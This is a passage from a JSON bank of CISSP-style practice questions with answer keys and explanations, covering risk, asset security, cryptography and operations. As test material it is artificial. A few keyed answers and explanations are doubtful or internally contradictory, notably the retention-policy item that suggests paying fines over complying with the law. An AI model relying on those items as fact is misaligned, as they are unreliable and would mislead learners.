      "explanation": "Option 2 is correct. Based on the calculations, the correct answer is option B. The Asset Value (AV) of the company is $700,000, and the company experiences a DDoS attack every month, resulting in an Annual Rate of Occurrence (ARO) of 12. The monthly loss in profit margin is 1%, and the Exposure Factor (EF) is also 1%. Using the formula SLE = AV * EF, the Single Loss Expectancy (SLE) is calculated to be $7,000. The Annual Loss Expectancy (ALE) is then determined by multiplying SLE with ARO, which gives $84,000. To protect against DDoS attacks, the company is considering purchasing a DDoS protection plan for $240,000 over three years, which is equivalent to $80,000 per year. According to the cost-benefit analysis, the cost of the control should not exceed the cost of the asset that needs to be protected. As the ALE for the DDoS attacks is $84,000, purchasing the DDoS protection plan for $80,000 per year is a wise decision."
    },
    {
      "id": "d1-q81",
      "domain": "1. Security and Risk Management",
      "stem": "An enterprise has been the victim of a cyberattack and the CISO, in collaboration with the information security manager, proposes various information security programs to safeguard the enterprise and reduce risks to an acceptable level. Moreover, the enterprise implemented the proposed controls and the attacks on the assets have been reduced substantially. However, there are still security risks to some specific assets, known as residual risks, that occur due to the lack of cost-effective safeguards and security control gaps. Who is ULTIMATELY responsible for deciding on the acceptable level of residual risk to the assets?",
      "choices": [
        "Chief Information Security Officer (CISO)",
        "Information security manager",
        "Senior management",
        "Security engineer"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Senior management has the highest authority to decide on the acceptable level of residual risk within an organization. Option 1 is incorrect. The CISO may be a member of senior management but will not be in a position to decide on the acceptable level of residual risk alone. Option 2 is not correct because the information security manager may develop and propose information security programs to keep residual risks at an acceptable level but will not be responsible for setting the acceptable level of residual risk. Option 4 is incorrect. The security engineer handles day-to-day security operations within the organization but is not responsible for deciding on residual risk levels."
    },
    {
      "id": "d7-q62",
      "domain": "7. Security Operations",
      "stem": "The chief safety officer (CSO) of an enterprise is worried about the well-being and safety of personnel, contracts, and visitors of the business in the wake of a perceived hurricane. In addition, the business does not have guidelines and procedures in place to evacuate people during environmental incidents. The CSO and their team plan to have procedures in place before the disaster strikes. What is the most appropriate option plan to adopt?",
      "choices": [
        "Continuity of operations plan (COOP)",
        "Occupant Emergency Plan (OEP)",
        "Business continuity plan (BCP)",
        "Disaster recovery plan (DRP)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. An occupant emergency plan (OEP) is the most appropriate to deal with human safety issues during emergencies. COOP strives to make businesses function immediately after disaster hits and continues until services are restored to normal status. BCP is a business issue and proactively prepares organizations to remain vigilant in running their businesses before, during, and after disastrous events. DRP is a subset of BCP and focuses on restoring IT systems after disaster strikes."
    },
    {
      "id": "d7-q63",
      "domain": "7. Security Operations",
      "stem": "An enterprise functions in High Availability (HA) mode and tolerates no interruption to its operations. It has loyal customers who will never tolerate downtime, and the business may lose them if any disruptions occur. They therefore want to ensure there are no interruptions to operations while they conduct an annual exercise of their Disaster Recovery Plan (DRP). They are looking for a type of test that is less intrusive and provides the most assurance that its plan will work as expected. What is the most appropriate option type of testing to satisfy the requirement?",
      "choices": [
        "Full interruption testing",
        "Parallel testing",
        "Structured walkthrough testing",
        "Simulation testing"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. In simulation testing, testers do not cause disruption of operations but rather execute their exercise on simulated scenarios to evaluate the effectiveness of the plan. It is less intrusive compared to full interruption and parallel tests. In parallel testing, the primary and the secondary sites exchange information during testing and there is a probability of disruption and intrusion because the test will be conducted in functional environments. Whereas simulation testing will be conducted in a totally simulated environment and there is no interruption of business, full interruption (1) and parallel tests (2) may cause disruption to operations. There will not be a disruption when conducting structured walkthrough testing (3), but it is less effective than simulation testing. The effectiveness of the testing types, from most effective to least effective, will be in the order of Full-interruption -> Parallel -> Simulation -> Structured Walk-Through. But the probability of disruptions and intrusiveness to business will be in reverse order."
    },
    {
      "id": "d7-q64",
      "domain": "7. Security Operations",
      "stem": "A certain enterprise deems its most valuable asset to be its data. As a result, the business wants to protect the data regardless of its state and the media it resides on. The newly hired chief information security officer (CISO) plans to adopt techniques to ensure data remains secure while in transit, in use, and at rest. They are more concerned about the unsanctioned use of removable media and want to implement a security control to enforce the confidentiality of the data. Which option is the BEST control to achieve the data protection objective?",
      "choices": [
        "Internet protocol security (IPSec)",
        "Hashing function",
        "Full disk encryption (FDE)",
        "Digital Signature (DS)"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Full disk encryption (FDE) plays a crucial role in safeguarding removable media. The security objective is confidentiality, and the most appropriate control to protect against unauthorized disclosure of the data will be disk encryption. Hashing functions serve integrity, not confidentiality. Even though IPSec serves confidentiality of data, it is only appropriate to apply when data is on the move. A digital signature serves integrity, authentication, and nonrepudiation requirements, but never confidentiality of data."
    },
    {
      "id": "d7-q65",
      "domain": "7. Security Operations",
      "stem": "A system engineer at an enterprise is responsible for securely deploying and configuring homemade and commercial off-the-shelf (COTS) systems as per the baseline. They exhaustively test systems in the test platform before moving them to the production environment. Moreover, they specifically change default settings and credentials, disable and enable services as per the baseline, apply patches and tests them, closes unnecessary ports, and upgrades security controls. Which option MAINLY summarizes these activities?",
      "choices": [
        "Configuration management",
        "System hardening",
        "Benchmarking",
        "Change management"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Most breaches become successful due to vulnerable systems. Disabling those services that will increase exposure and enabling those that may help to safeguard information systems are some system hardening components. Configuration management focuses on the secure configuration of systems. In contrast, change management focuses on the secure transition of systems from one secure state to another secure state through change planning, requests, and approval. Benchmarking is setting the minimum baseline to secure systems."
    },
    {
      "id": "d7-q66",
      "domain": "7. Security Operations",
      "stem": "An enterprise has been a victim of malicious intrusions and plans to establish controls to log and continuously monitor activities of their information systems. The CISO wants to deploy host and network-based solutions that are capable of detecting intrusions, generating alerts, filtering content, and stopping evasive intrusions when necessary. What is the most effective option to meet the CISO'S needs?",
      "choices": [
        "Intrusion detection system (IDS)",
        "Network access control (NAC)",
        "Intrusion prevention systems (IPS)",
        "Data loss prevention (DLP)"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Intrusion Prevention Systems are the best solutions to stop intrusions besides detecting them. IDSs, be they network-based or host-based, are capable of detecting and alerting intrusions but can never stop intrusions of any sort, whereas IPSs are able to stop intrusions alongside detecting and alerting about intrusions and provide content filtering services. NAC is a security control that blocks unauthorized users and devices from gaining access to a corporate network."
    },
    {
      "id": "d7-q67",
      "domain": "7. Security Operations",
      "stem": "A business applies system upgrades and patches without following formal processes of testing and evaluation. The chief information security officer (CISO) is unhappy about that and wants to adopt processes to enable a smooth transition of systems when upgrades and patches are applied. The CISO therefore demands a process to plan, request, test, and evaluate all system upgrades and patches in the test environment. In addition, they require review and approval of any upgrades and patches before deploying them into production. What best describes the control in the scenario?",
      "choices": [
        "Patch Management",
        "Configuration Management",
        "Change management",
        "Risk Management"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. The CISO is trying to enforce formal change management control in the organization. Configuration management focuses on the secure configuration of those changes. Patch management is a subset of change management. Risk management focuses on reducing risk to an acceptable level in the organization."
    },
    {
      "id": "d2-q48",
      "domain": "2. Asset Security",
      "stem": "An enterprise handles and processes highly classified data. The business has mature classification processes in place. However, the chief security officer (CSO) is concerned about the declassification processes and wants to establish a control to protect data when it is declassified. The CSO is specifically looking for a process that replaces a sensitive piece of data with non-sensitive characters and numbers. Which option controls BEST meets the requirement of the CSO?",
      "choices": [
        "Masking",
        "Tokenization",
        "Encryption",
        "Steganography"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. This is the definition of the tokenization process in declassification activities. Masking (1) is similar to Tokenization but involves some sort of hiding besides replacing characters and thus is not the best answer. Encryption (3) is concerned with enforcing the secrecy of a message through substitution and transposition-based cryptographic algorithms. Rather than replacing sensitive data with non-sensitive characters and numbers, encryption mainly relies on keys to protect data. Steganography (4) is concerned with hiding a message inside another message, such as hiding a message inside an image and is therefore incorrect."
    },
    {
      "id": "d1-q82",
      "domain": "1. Security and Risk Management",
      "stem": "ABC Limited is a service provider firm founded under Indian laws and regulations. It has branches all over India and more branches overseas, such as in Nepal, Bhutan, and Bangladesh. The business settles most customer disputes by applying the laws and regulations of Indian jurisdictions. However, a particular Nepalese customer has cited local laws to process the compensation for damages caused by the provider to its businesses. ABC, on the other hand, insisted on compensating the customer using the jurisdictional laws of India. Which option will be the MOST binding to handle the case outlined in the scenario?",
      "choices": [
        "Indian laws",
        "Organization for Economic Cooperation and Development (OECD)",
        "Asia-Pacific Economic Cooperation (APEC)",
        "Nepalese laws"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. Local laws always take precedence and have the capacity to override international laws. Entities should assess local laws before entering into any binding contractual agreements. Even though the company was founded in India under Indian laws, the local Nepalese laws take precedence over their Indian counterpart in the ruling of the case. The Organization for Economic Cooperation and Development (OECD) is a framework for promoting economic development and social empowerment of people around the world. Asia-Pacific Economic Cooperation (APEC) is a framework concerned with the information and privacy protection of member states and has no relation to the scenario under consideration."
    },
    {
      "id": "d2-q49",
      "domain": "2. Asset Security",
      "stem": "ABC Limited plans to develop asset retention policies to help them handle proprietary assets and preserve data. Moreover, the business has arranged discussions with business unit leaders and stakeholders to incorporate their needs into the policy. After successive meetings, the business has produced a formal asset and data retention policy. In addition, it requires all data processors and controllers to apply the policy without exception. However, the team assigned to apply the policy faces a challenge with the preserved records and requested policy exceptions. What will be the PRIMARY factor to consider when dealing with exceptions?",
      "choices": [
        "Legal and regulatory compliance",
        "Industry standards",
        "Organizational framework",
        "Business requirements"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. No organizational policy, including policy exception, will override legal and regulatory compliance requirements. However, unless the business requirement dictates the absolute necessity of the policy, it might be more feasible to pay fines and penalties than to comply with legal and regulatory requirements. Therefore, the business requirement will be the driving factor when it comes to dealing with policy development endeavors. Industry standards and organizational frameworks may be important components to consider but they are not the primary factors."
    },
    {
      "id": "d7-q68",
      "domain": "7. Security Operations",
      "stem": "Enterprises employ different mechanisms to understand the status of each system deployed on-premises and off-premises. Some establish threat hunting to explore possible threats to the security controls in place. Others establish scanning and penetration testing activities to discover and record possible weaknesses in their infrastructures, architectures, and systems. Some other companies even pay bug bounties to individuals who discover weaknesses in their assets. Companies perform these activities ultimately to apply security controls, updates, and patches in a timely manner. Which option MAINLY demonstrates the requirements described in the scenario?",
      "choices": [
        "Vulnerability management",
        "Patch management",
        "Configuration management",
        "Change management"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. The whole purpose of vulnerability management is to discover and formally manage the weaknesses of systems and architectures before it is too late. After companies properly access and manage vulnerabilities, specific security controls will be implemented to address the security weaknesses. Organizations should have a holistic view of vulnerabilities so that they can deploy safeguards proactively. Patch management is concerned with updating software or firmware to mitigate vulnerabilities. Change management is a means to control the state of an asset when transitioning from one secure state to another. Configuration management concerns maintaining systems in a known good state."
    },
    {
      "id": "d2-q50",
      "domain": "2. Asset Security",
      "stem": "ABC Limited plans to properly handle organizational assets and employ security controls according to their sensitivity and criticality levels. Moreover, assets will be logically and physically labeled and marked visible to avoid mishandling when employees with different security clearances access them. These schemes will further serve to provision and de-provision assets to entities and users. Besides, these will help the enterprise to not under-protect or over-protect assets unnecessarily. Which option will be the FIRST process to undertake to achieve the requirements outlined in the scenario?",
      "choices": [
        "Asset classification",
        "Asset categorization",
        "Asset inventory",
        "Asset valuation"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Inventorying organizational assets is the foundational step before classifying, categorizing, and valuing them. The requirements demonstrated in the scenario refer to asset and data classification processes in organizations. Asset categorization refers to the grouping of classified assets according to requirements. Asset valuation focuses on assigning values to assets and is done after a complete inventory of organizational assets."
    },
    {
      "id": "d1-q83",
      "domain": "1. Security and Risk Management",
      "stem": "Alen is a researcher and recently developed some algorithmic pseudocode that improves the performance of a face-based verification and identification system by 0.25 seconds. He experimentally proved the claim, and further wants to register it as his intellectual property. What is the most appropriate option way to register his scientific finding?",
      "choices": [
        "Patent",
        "Copyright",
        "Trademark",
        "Trade secret"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Copyright is an intellectual property that focuses on protecting software code, artistic creations, movies, songs, books, and so on of individuals. A patent, on the other hand, is an intellectual property right granted to an inventor. A trademark is a property right granted to protect distinguishing symbols, words, graphics, and so on of an organization from being used by other parties. A trade secret is an intellectual property right applied to protect formulas, processes, practices, and so on created by organizations."
    },
    {
      "id": "d3-q61",
      "domain": "3. Security Architecture and Engineering",
      "stem": "Robert wants to establish secure web communication with an e-commerce platform before making payments through a browser of his choice. He specifically wants to verify the status and validity of the digital certificate in his web browser. He checked for the green lock in the address bar of the browser, and it was working as expected. However, he recently learned that there are some delays between browsers downloading and applying the validity of digital certificates on the web. Furthermore, he wants a real-time certificate verification process before issuing the payments. Which option satisfies Robert’s requirement?",
      "choices": [
        "Certificate Revocation List (CRL)",
        "Certificate Practice Statement (CPS)",
        "Online Certificate Status Protocol (OCSP)",
        "Certificate Policy Statement (CPS)"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Online Certificate Status Protocol (OCSP) is used to verify digital certificates in real time and is the most reliable means of verification. A Certificate Revocation List (CRL) serves the same function as OCSP but incorporates a delay and is not real time. A Certificate Practice Statement (CPS) defines the practices the Certificate Authority (CA) employs in issuing and managing digital certificates. A Certificate Policy Statement (CPS), on the other hand, defines a set of rules that will dictate the applicability of the digital certificate."
    },
    {
      "id": "d7-q69",
      "domain": "7. Security Operations",
      "stem": "ABC Limited is a Certificate Authority (CA) that issues digital certificates for entities and employs the Separation of Duties (SoD) principle for individuals responsible for generating digital keys. Moreover, the business divides the key generation and management process among three individuals and requires their involvement at every key signing ceremony. What is the PRIMARY purpose of the SoD demonstrated in the scenario?",
      "choices": [
        "Prevent fraudulent acts",
        "Prevent collusion",
        "Increase productivity",
        "Optimize performance"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Separation of Duties (SoD) focuses on preventing fraud and enforces checks and balances. Therefore, the purpose of SoD in the key generation process is mainly to prevent fraud and thereby increase the trustfulness of the certificate. Preventing collusion is a means to achieve fraud prevention, not the end goal in itself, and hence option 2 is incorrect. Increased productivity and performance optimization may help the process, but they are not the primary purposes."
    },
    {
      "id": "d3-q62",
      "domain": "3. Security Architecture and Engineering",
      "stem": "ABC Limited has recently decided to move its applications to the cloud. Chandra, the cloud security architect, is tasked with developing a secure deployment architecture capable of enforcing security between ABC and the Cloud Service Provider (CSP). What is the most effective option and efficient approach to protect ABC’s data?",
      "choices": [
        "Shared Responsibility Model (SRM)",
        "Cloud Access Security Broker (CASB)",
        "Data Loss Prevention (DLP)",
        "Cloud Security Alliance (CSA)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. The Cloud Access Security Broker (CASB) sits between the cloud service consumer and cloud service providers and enforces the cloud security concerns of the customers. The Shared Responsibility Model (SRM) focuses on disclosing the responsibilities of cloud service providers and cloud service customers. Data Loss Prevention (DLP) primarily prevents data leakage from organizations. The Cloud Security Alliance (CSA) is an international organization focused on the security realm of cloud computing."
    },
    {
      "id": "d3-q63",
      "domain": "3. Security Architecture and Engineering",
      "stem": "Mr. Kahn works in ABC Limited and oversees the privacy of customer data. The business signed contractual agreements with a Cloud Service Provider (CSP) and hosted all its applications on the cloud platform. Unfortunately, the provider sustained a delicate cyberattack recently and customers’ private data was compromised because of the attack. Who is ULTIMATELY responsible for the data breach?",
      "choices": [
        "The Cloud Service Provider (CSP)",
        "The privacy officer",
        "The customers of ABC",
        "The Cloud Service Customer (CSC)"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. The Cloud Service Customer (CSC) and Cloud Service Provider (CSP) share responsibilities in line with the Shared Responsibility Model (SRM). However, the customer can never share liability and is ultimately responsible for the data breach and any resulting damage. The privacy officer shares some responsibility to protect the data of the customers. However, they are not ultimately responsible for the data breach and option 2 is, therefore, an incorrect option."
    },
    {
      "id": "d3-q64",
      "domain": "3. Security Architecture and Engineering",
      "stem": "Raj wanted to send a digitally signed message to Omar. To do so, he generated a hash value using SHA2-256 and encrypted it using his private key. He then appended the signed message to the plaintext and transmitted it to Omar. After receiving the message, Omar decrypted it using Raj's public key and generated a hash value of his own using the same algorithm. He then compared the two hash values and made a couple of decisions about the received message. Which option is BEST served by the scenario outlined?",
      "choices": [
        "Confidentiality, Integrity, Availability (CIA)",
        "Confidentiality, Integrity, Authentication (CIA)",
        "Authentication, Integrity, Availability",
        "Authentication, Integrity, Non-repudiation"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. The concept demonstrated in the scenario describes the set of steps employed in the digital signature. The digital signature’s purpose is to provide the authentication, integrity, and non-repudiation of messages and documents, but never confidentiality. Non-repudiation is a cryptographic service used to prevent denial on the part of either a message receiver or sender. Integrity is a security objective used to protect data from being tampered with by an unauthorized entity. Authentication is a means to prove the claimed identity of an entity. Options that contain confidentiality are therefore incorrect ones. Furthermore, cryptographic algorithms do not serve availability and thus option 3 is incorrect."
    },
    {
      "id": "d1-q84",
      "domain": "1. Security and Risk Management",
      "stem": "ABC Limited is a multi-billion-dollar business equipped with best-of-breed security controls. However, the Chief Information Security Officer (CISO) recently learned that the business has become the target of continuous phishing attacks. She has started contemplating developing a security solution to minimize the risk. Which option will be the MOST effective control?",
      "choices": [
        "Patching and upgrading all servers and services",
        "Conduct security awareness programs",
        "Full-disk encryption of all removable devices",
        "Security Information and Event Management (SIEM)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Technical controls may play their fair share in minimizing the organizational risk. However, conducting continuous security awareness-raising programs is the best antidote to phishing attacks. This is because phishing attacks exploit the weakest link in an organization, that is the personnel. Patching and upgrading services are one of the most crucial hygiene practices of security but they are secondary to awareness training. Full-disk encryption of removable devices deals with protecting data at rest. Security Information and Event Management (SIEM) is one of the best security solutions to analyze and correlate logs."
    },
    {
      "id": "d3-q65",
      "domain": "3. Security Architecture and Engineering",
      "stem": "Prashant is the system administrator of ABC Limited. Moreover, he is responsible for managing all the physical and virtual IT components in the business. During a log analysis routine, he found out that unusual activity came from unknown and unapproved devices that do not follow business security policy. The business is facing security concerns MAINLY from ________________?",
      "choices": [
        "Server sprawl",
        "Bring Your Own Devices (BYOD)",
        "Shadow IT",
        "Virtual Machine (VM) escaping"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Shadow IT occurs when individuals or departments deploy IT components without the knowledge and approval of IT departments and senior management. It has the potential to increase the overall organizational risk from unauthorized entities. Server sprawl occurs when servers are underutilized. Bring Your Own Devices (BYOD) is a policy where an organization allows their employees to come to work with their personally owned devices. Virtual Machine (VM) escaping is an issue involving a violation of the isolation services of hypervisors."
    },
    {
      "id": "d1-q85",
      "domain": "1. Security and Risk Management",
      "stem": "ABC Limited plans to develop mechanisms to handle potential vulnerabilities and threats to all of its information systems. Moreover, the senior management has recently established a risk management division to realize this initiative. The division will be responsible for identifying, analyzing, evaluating, and mitigating organizational risks based on the security threats and vulnerabilities to each information system. The business additionally wants to have a holistic view of risks and be able to deploy appropriate security controls depending on the risk assessment reports. What will be the ULTIMATE purpose of the risk management initiative?",
      "choices": [
        "Eliminate risk from information systems",
        "Reduce risk to an acceptable level",
        "Prioritize and select security controls",
        "Perform a cost/benefit analysis"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. It is neither feasible nor cost-effective to eliminate all the organizational risks from information systems. The primary purpose of the risk management strategy will be to reduce risks and maintain them at a level acceptable to the organization. The prioritization and selection of controls occur after thoroughly assessing the security risks to the information systems. A Cost Benefit Analysis (CBA) is performed to prioritize and select security controls for the identified risks."
    },
    {
      "id": "d3-q66",
      "domain": "3. Security Architecture and Engineering",
      "stem": "Data is encrypted at rest and in transit, but it is usually decrypted while in use. Which encryption method ALLOWS computation to be performed on encrypted data?",
      "choices": [
        "Symmetric encryption",
        "Asymmetric encryption",
        "Homomorphic encryption",
        "End-to-end encryption"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Homomorphic encryption allows the data to be computed in encrypted form. When you compute the encrypted data using a homographic algorithm, the output matches the computation result performed on the same plaintext data. This encryption method is used to protect the user’s privacy while the data is in use. This question is about performing computation on encrypted data, hence option 3 is correct. Symmetric and asymmetric encryption are used to encrypt and decrypt data using key-pair values. These encryption methods are used when data is in transit or at rest. These encryption methods do not perform computation on encrypted data, hence this option is incorrect. End-to-end encryption is also used to encrypt data in transit. This encryption method only encrypts the data payload, keeping the headers, trailer, and routing data unchanged. This method is usually used in IPSEC tunnels and does not perform computation on encrypted data, hence this option is incorrect."
    },
    {
      "id": "d3-q67",
      "domain": "3. Security Architecture and Engineering",
      "stem": "Cryptanalysts are trying to break into a cryptosystem that uses a quantum algorithm to spread ransomware. These analysts gather information by observing changes in processing power, memory utilization, and electromagnetic radiation while the data is encrypted. What KIND of attack are the cryptanalysts performing to break into the system?",
      "choices": [
        "Side-channel attack",
        "Statistical attack",
        "Fault injection attack",
        "Timing attack"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Side-channel attacks are passive, non-invasive attacks wherein the attacker observes the system to gain valuable information. Since the cryptanalysts are observing the changes in the processing power, memory utilization, and electromagnetic radiation without tapping into the system, option 1 is correct. Statistical attacks attempt to exploit a vulnerability in the hardware or software of a cryptosystem. The analyst is not exploiting any vulnerability, hence option 2 is incorrect. Fault injection attacks are invasive attacks where an attacker attempts to find the faults in the cryptosystem by causing some type of external fault, for example, supplying low or high voltage to the system. In this scenario, cryptanalysts are just observing the system passively, hence this option is incorrect. In timing attacks, attackers monitor the processing time of a cryptographic process, hence option 3 is incorrect too."
    },
    {
      "id": "d3-q68",
      "domain": "3. Security Architecture and Engineering",
      "stem": "Sara is looking to implement an access control model in her enterprise. Since she works in the finance industry, preserving the integrity of transactional data is her highest priority. After her research, she chose to implement the Clark-Wilson model. What are the TWO main principles this model uses to preserve integrity?",
      "choices": [
        "Separation of duties and need to know",
        "Least privilege and separation of duties",
        "Well-defined transactions and need to know",
        "Well-defined transactions and separation of duties"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. The Clark-Wilson model uses well-defined transactions and separation of duties to protect integrity. This model is also called the access control triplet because it uses a three-part relationship between subject, object, and program. The model uses security labels to grant the subject access to an object through a restricted interface. Each interface has a limitation of what it can do and which objects a subject is allowed to access. It uses Transformation Procedures (TPs) that are used to modify Constrained Data Items (CDIs). A subject has to follow the TPs in order to modify the CDI, while Unconstrained Data Items (UDIs) can be modified directly without going through TP. This forms the backbone of the Clark-Wilson model."
    },
    {
      "id": "d1-q86",
      "domain": "1. Security and Risk Management",
      "stem": "One of the vendors involved in your Supply Chain Management is attacked by a group of hackers, and the vendor's private data is now publicly available over the internet. What is the best way to ensure that the data breach has no impact on your enterprise's environment?",
      "choices": [
        "Diversify Supplier Relationships to Avoid Delays",
        "Define a Security Policy to enforce Zero Trust",
        "End your contract with the Vendor",
        "Harden the contractor recruitment process"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. The best way to ensure security in this situation is to define a proper security policy that enforces Zero Trust, such that all the accesses must be validated every time. Zero Trust is a strategic approach to cybersecurity that secures an organization by eliminating implicit trust and continuously validating every stage of a digital interaction."
    },
    {
      "id": "d1-q87",
      "domain": "1. Security and Risk Management",
      "stem": "One of the new employees is found to have sent confidential client documents to her personal email. What should be the first step in handling this situation?",
      "choices": [
        "Terminate the Employee",
        "Review Acceptable Use Policy (AUP) with the employee",
        "Disable Email Access",
        "Take disciplinary actions as defined in the AUP"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. The first step should be to review the Acceptable Use Policy (AUP) with the employee to re-educate them on best practices. Educate the employee first to change the employee's behavior. Assign mandatory training to the employee and monitor their activities. If the issue still persists, disciplinary actions need to be taken as defined in the AUP (4)."
    },
    {
      "id": "d7-q70",
      "domain": "7. Security Operations",
      "stem": "FilledCart.com is an online shopping platform that incorporates High Availability by utilizing a Load Balancer with a Sticky Session configuration. This enables efficient use of data and memory, allowing better session management. Which option options is a drawback of the Sticky Session configuration?",
      "choices": [
        "It requires a change to the application",
        "Sticky Session overloads the server",
        "It limits your application scalability",
        "It requires complex configuration"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Most websites maintain continuity of state using a session. A session object is created when a client makes their first request to the server. This object may be stored in server RAM, a file on the server, passed back to the client in an HTTP cookie, stored in a database, or stored in the client's browser as cookies. All subsequent requests use the same session object. However, the cons of a Sticky Session are: 1. It limits your application scalability (3) as the load balancer cannot distribute the load evenly each time it receives a request from a client. 2. If the server goes down, then the session is lost. If the session has important user information, it could be lost. A Sticky Session does not require changes to the application (1) and is a feature provided by almost every Load Balancer so it does not require complex configuration (4)."
    },
    {
      "id": "d7-q71",
      "domain": "7. Security Operations",
      "stem": "Recently your enterprise suffered a DDoS attack which affected the services provided by your enterprise. What is the first step that the Enterprise Disaster Recovery Team will perform in this situation?",
      "choices": [
        "Mitigation",
        "Recovery",
        "Restoration",
        "Communication"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. In this situation, the first step that the Organization Disaster Recovery Process team will perform will be to recover from the DDOS event and restore the availability of the system. When disaster strikes, you want to get back to normal as quickly as possible. A disaster recovery team may be assigned to implement and maintain operations at the recovery site, and a salvage team may be assigned to restore the primary site to operational capacity. Make these allocations according to the needs of your organization and the types of disasters you face. Recovery Team A Recovery Team is a group of individuals with defined roles and responsibilities. They are responsible for maintaining the recovery procedures and coordinating the recovery and resumption of business functions, processes, or systems. Restoration Team The Restoration Team has the responsibility of returning the damaged primary site to its normal condition. Note: These team members are usually separate from the recovery team as they are not involved with the same issues as the typical recovery team. The team is mandated to safely clean, repair, salvage, and determine the viability of the primary site once the disaster has ended."
    },
    {
      "id": "d7-q72",
      "domain": "7. Security Operations",
      "stem": "Your enterprise opened a new office in another city. However, the office space provider does not have any control to protect against tailgating. What is the most cost-effective way to safeguard against tailgating?",
      "choices": [
        "Video Surveillance",
        "Installing security turnstiles",
        "A Visitor Register",
        "User Education"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. The best way to safeguard against tailgating is to educate users against it. Installing physical security controls like turnstiles will always help, but many times they are not effective because it's not difficult to climb or jump over them. They are also typically narrow and unfriendly to wheelchairs or walkers, requiring the addition of a turnstile gate. Video Surveillance is important as well, but it requires active monitoring which will increase the cost. Visitor Registers do not provide any control against tailgating."
    },
    {
      "id": "d7-q73",
      "domain": "7. Security Operations",
      "stem": "You are working on a critical delivery in your cubicle, and the Security Siren goes off. Everyone on the office floor is asked to move out as part of the Emergency Drill. What is the main reason for conducting Emergency Drills?",
      "choices": [
        "Train the Emergency Response team",
        "Familiarize employees with emergency procedures",
        "Follow the Emergency Response Policy",
        "Engage employees in Emergency Response Plans"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. The goal of workplace Emergency drills is to familiarize employees with emergency procedures and the location of means of egress components provided within the facility. A fire drill is a tool that is used to ensure that occupants react properly in the event of an actual emergency within a facility."
    },
    {
      "id": "d1-q88",
      "domain": "1. Security and Risk Management",
      "stem": "A Data Custodian wants to create a backup schedule for critical servers. Based on which metrics should they create the schedule?",
      "choices": [
        "Recovery Time Objective (RTO)",
        "Maximum Tolerable Downtime (MTD)",
        "Recovery Point Objective (RPO)",
        "Work Recovery Time (WRT)"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. The backup frequency should always be determined by the RPO. The Recovery Point Objective (RPO) is defined as the amount of data a company can afford to lose after recovery. It is usually measured in time, and it also defines backup frequency. For example: If the RPO is set for 1 hour and a disaster happens at 10:00 AM, then the company is willing to lose data within the 9:00 AM to 10:00 AM timeframe only. If backups are performed every 2 hours, then the last available backup is at 8 am which violates the RPO of 1 hour and the company will have to incur a data loss of 2 hours. B is incorrect. The Maximum Tolerable Downtime (MTD) is the maximum time a service or system can be down. Exceeding the MTD can cause severe losses to the organization. The MTD is represented as MTD ≤ RTO + WRT 1 is incorrect. The recovery time objective (RTO) is the time taken to restore a service or system. This value should be less than, or close to the MTD. Option 4 is not correct as Work Recovery Time (WRT) is the time taken to verify if all the services of a restored system are back up and running."
    },
    {
      "id": "d1-q89",
      "domain": "1. Security and Risk Management",
